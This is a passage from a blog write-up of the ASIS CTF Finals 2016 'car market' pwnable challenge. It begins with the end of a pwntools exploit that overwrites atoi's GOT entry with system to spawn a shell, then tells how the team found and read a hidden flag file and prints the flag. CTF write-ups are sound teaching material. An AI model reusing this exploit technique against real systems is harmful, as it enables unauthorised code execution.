    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"modifying car array..."</span><span class="p">)</span>
    <span class="n">choice</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span>
    <span class="n">data</span>   <span class="o">=</span> <span class="p">[</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x20</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'atoi'</span><span class="p">])]</span>
    <span class="n">sel_car_cust</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="nb">zip</span><span class="p">(</span><span class="n">choice</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>   
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span> <span class="c"># exit select car menu</span>
    
    <span class="c"># overwrite atoi's got</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overwriting atoi's got..."</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># select car</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"14"</span><span class="p">)</span> <span class="c"># input index</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span> <span class="c"># set model (atoi's got)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"model</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>

    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"get shell !"</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div></div>

<p>After I finished the exploit, I found it once again, the exploit has timeout due to the crappy internet connection. So I upload the exploit to trello and ask <strong>freetsubasa</strong> if she can send the payload for me. And then she told me that <strong>she had the shell spawned, but she can’t find the flag.</strong> What ?</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -la
total 40
drwxr-x--- 2 root marketpwn  4096 Sep  8 10:02 .
drwxr-xr-x 3 root root       4096 Sep  8 09:51 ..
lrwxrwxrwx 1 root marketpwn     9 Sep  8 09:59 .bash_history -&gt; /dev/null
-rw-r--r-- 1 root marketpwn   220 Sep  8 09:51 .bash_logout
-rw-r--r-- 1 root marketpwn  3771 Sep  8 09:51 .bashrc
-rwxr-xr-x 1 root marketpwn 10504 Sep  8 09:56 car_market
-r--r----- 1 root marketpwn    39 Sep  8 09:57 ._flag
-rw-r--r-- 1 root marketpwn   655 Sep  8 09:51 .profile
-rwxr-xr-x 1 root marketpwn   104 Sep  8 09:56 wrapper.sh
</code></pre></div></div>
<p>OK, so the ASIS organizer try to play some trick on us. It’s alright, no big deal, just give us the flag so we can pass the challenge.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat ._flag
cat: ._flag: No such file or directory
</code></pre></div></div>
<p>WHAT. THE. F*CK.</p>

<p>How is this even possible? The file is just right there and now you’re telling me the file does not exist? This is bullsh*t !@#$%^&amp;</p>

<p>So after we have the shell, we spent another 30 minutes trying to figure out how to read the god damn flag. After some trial &amp; error, teammate <strong>ddaa</strong> finally get the flag by using the <code class="highlighter-rouge">cat .*</code> command. It’s strange because I’ve tried <code class="highlighter-rouge">for f in .*;do cat $f;done</code> and it failed, don’t know why <strong>:/</strong></p>

<p>Anyway we finally got the flag and the 177 points. The binary itself was a great challenge, but the command line one was kind of evil <strong>-.-</strong></p>

<p>flag: <code class="highlighter-rouge">ASIS{a0b8813fc566836c8b5f37fe68c684c5}</code></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#asis" class="page__taxonomy-item" rel="tag">ASIS</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#heap" class="page__taxonomy-item" rel="tag">heap</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#off-by-one" class="page__taxonomy-item" rel="tag">off-by-one</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#use-after-free" class="page__taxonomy-item" rel="tag">use_after_free</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2016-09-13T16:54:00+08:00">September 13, 2016</time></p>
        
      </footer>

      <section class="page__share">
  

  <a href="https://twitter.com/intent/tweet?text=ASIS+CTF+Finals+2016+--+car+market%20http%3A%2F%2F0.0.0.0%3A4000%2Fasis-ctf-finals-2016-car-market%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fasis-ctf-finals-2016-car-market%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2Fasis-ctf-finals-2016-car-market%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>

</section>


      
  <nav class="pagination">
    
      <a href="/mma-2nd-ctf-2016-interpreter/" class="pagination--pager" title="MMA 2nd CTF 2016 – Interpreter
">Previous</a>
    
    
      <a href="/869100/" class="pagination--pager" title="ASIS CTF Finals 2016 – shadow
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You May Also Enjoy</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/flare-on-challenge-2018-write-up/" rel="permalink">Flare-on Challenge 2018 Write-up
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Flare-on challenge is a Reverse-style CTF challenge created by the FireEye FLARE team. The CTF contains lots of interesting, real-world style reversing chall...</p>
  </article>
</div>
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/some-notes-on-migrating-to-jekyll/" rel="permalink">Some notes on migrating to Jekyll
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Recently I’ve decided to migrate my blogging framework from Hexo to Jekyll. Here are some notes that I took for recording the migration process.

</p>
  </article>
</div>
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Chakrazy is a browser CTF challenge created by team PPP for the 2017 PlaidCTF event. It’s a challenge based on Microsoft’s ChakraCore Javascript engine. You ...</p>
  </article>
</div>
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">So I’ve been playing with the browser exploitation recently, by studying some browser CTF challenges. So far I’ve tried qwn2own, SGX_Browser and feuerfuchs.

</p>
  </article>
</div>
        
      </div>
    </div>
  
</div>
    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
    <div id="results" class="results"></div></div>
      </div>
    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    
      
        
          <li><a href="https://creativecommons.org/licenses/by-nc-sa/3.0/"><i class="fab fa-fw fa-creative-commons" aria-hidden="true"></i> </a></li>
        
      
        
          <li><a href="https://creativecommons.org/licenses/by-nc-sa/3.0/"><i class="fab fa-fw fa-creative-commons-by" aria-hidden="true"></i> </a></li>
        
      
        
          <li><a href="https://creativecommons.org/licenses/by-nc-sa/3.0/"><i class="fab fa-fw fa-creative-commons-nc" aria-hidden="true"></i> </a></li>
        
      
        
          <li><a href="https://creativecommons.org/licenses/by-nc-sa/3.0/"><i class="fab fa-fw fa-creative-commons-sa" aria-hidden="true"></i> </a></li>
        
      
    

  </ul>
</div>

<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://use.fontawesome.com/releases/v5.3.1/js/all.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




    
  <script>
    var disqus_config = function () {
      this.page.url = "http://0.0.0.0:4000/asis-ctf-finals-2016-car-market/";  // Replace PAGE_URL with your page's canonical URL variable
      this.page.identifier = "/asis-ctf-finals-2016-car-market"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
    (function() { // DON'T EDIT BELOW THIS LINE
      var d = document, s = d.createElement('script');
      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


  



  </body>
</html>